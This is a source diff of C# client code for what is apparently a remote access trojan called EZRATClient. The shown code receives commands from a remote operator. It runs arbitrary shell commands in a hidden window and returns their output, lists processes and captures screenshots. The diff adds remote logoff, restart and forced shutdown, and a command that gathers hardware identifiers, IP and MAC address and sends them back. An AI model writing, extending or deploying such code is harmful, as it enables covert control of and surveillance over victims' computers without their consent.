@@ -327,7 +327,8 @@ namespace EZRATClient
                     result += $"{proc[i].ProcessName}¦{proc[i].Id};";
                 }
                 SendCommand(result);
-            }else if(text == "scrnshot;")
+            }
+            else if (text == "scrnshot;")
             {
                 using (MemoryStream ms = new MemoryStream())
                 {
@@ -342,9 +343,53 @@ namespace EZRATClient
                 string[] lines = text.Split(';');
                 ExecuteCommand(lines[1], lines[0]);
             }
+            else if (text.StartsWith("control;"))
+            {
+                text = text.Substring(8);
+                switch (text)
+                {
+                    case "0":
+                        WindowsControl("shutdown /l");
+                        break;
+                    case "1":
+                        WindowsControl("shutdown /r /t 00");
+                        break;
+                    case "2":
+                        WindowsControl("shutdown /s /f /p /t 00");
+                        break;
+                    default:
+                        break;
+                }
+            } else if(text == "sysinfo;")
+            {
+                string result = "sysinfo;";
+                result += SystemInfoDetails.GetBiosIdentifier();
+                result += "¦";
+                result += SystemInfoDetails.GetCpuName();
+                result += "¦";
+                result += SystemInfoDetails.GetGpuName();
+                result += "¦";
+                result += SystemInfoDetails.GetLanIp();
+                result += "¦";
+                result += SystemInfoDetails.GetMacAddress();
+                result += "¦";
+                result += SystemInfoDetails.GetMainboardIdentifier();
+                result += "¦";
+                result += SystemInfoDetails.GetTotalRamAmount();
+                SendCommand(result);
+            }
         }
 
-
+        private static void WindowsControl(string command)
+        {
+            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/C " + command);
+            procStartInfo.RedirectStandardOutput = false;
+            procStartInfo.UseShellExecute = false;
+            procStartInfo.CreateNoWindow = true;
+            System.Diagnostics.Process proc = new System.Diagnostics.Process();
+            proc.StartInfo = procStartInfo;
+            proc.Start();
+        }
         private static void ExecuteCommand(string command, string path = "C:\\")
         {
             ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/C " + command);
@@ -357,7 +402,7 @@ namespace EZRATClient
             proc.StartInfo = procStartInfo;
             proc.Start();
             string result = proc.StandardOutput.ReadToEnd();
-            SendCommand("cmd;" +path +";"+result);
+            SendCommand("cmd;" + path + ";" + result);
         }
         private static void ReceiveFile(byte[] data, string path)
         {
